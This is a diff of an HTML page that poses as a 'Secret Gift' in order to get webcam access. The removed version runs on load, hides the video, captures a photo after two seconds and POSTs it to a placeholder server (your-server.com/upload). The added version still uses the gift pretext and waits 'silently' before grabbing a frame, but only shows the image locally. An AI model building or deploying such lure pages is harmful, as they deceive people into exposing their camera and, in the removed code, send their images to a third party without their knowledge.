@@ -1,66 +1,67 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Camera Link Capture</title>
+  <title>🎁 Secret Gift</title>
   <style>
     body {
-      background: #111;
+      background: black;
       color: white;
       text-align: center;
-      padding: 30px;
-      font-family: sans-serif;
+      padding-top: 100px;
+    }
+    #gift {
+      font-size: 40px;
+      cursor: pointer;
+    }
+    #preview {
+      margin-top: 30px;
+      display: none;
+      width: 200px;
+      border-radius: 12px;
     }
   </style>
 </head>
 <body>
-
-  <h2>🎁 Opening Gift...</h2>
-  <p>Please wait...</p>
-
-  <video id="video" autoplay playsinline style="display:none;"></video>
-  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+  <div id="gift">🎁 Open Gift</div>
+  <video id="video" autoplay style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <img id="preview" alt="Captured">
 
   <script>
-    async function captureAndSend() {
+    const gift = document.getElementById("gift");
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const preview = document.getElementById("preview");
+
+    gift.onclick = async () => {
+      gift.textContent = "Opening Gift... 🎁";
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
         video.srcObject = stream;
+        video.play();
 
-        video.onloadedmetadata = () => {
-          setTimeout(() => {
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageData = canvas.toDataURL('image/png');
+        // Wait 2 seconds silently
+        await new Promise(res => setTimeout(res, 2000));
 
-            // Stop camera
-            stream.getTracks().forEach(track => track.stop());
+        const context = canvas.getContext('2d');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // Send to backend
-            fetch('https://your-server.com/upload', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ image: imageData })
-            })
-            .then(res => res.json())
-            .then(data => {
-              document.body.innerHTML = `<h2>🎉 Thank you!</h2><p>Your photo has been captured.</p>`;
-            })
-            .catch(err => {
-              alert('Error uploading image: ' + err.message);
-            });
-          }, 2000);
-        };
+        // Stop camera
+        stream.getTracks().forEach(track => track.stop());
 
+        const imageDataUrl = canvas.toDataURL('image/png');
+        preview.src = imageDataUrl;
+        preview.style.display = "block";
+
+        gift.textContent = "🎁 Gift Captured!";
       } catch (err) {
-        alert("Camera Error: " + err.message);
+        alert("❌ Camera error: " + err.message);
+        gift.textContent = "🎁 Open Gift";
       }
-    }
-
-    captureAndSend();
+    };
   </script>
-
 </body>
 </html>
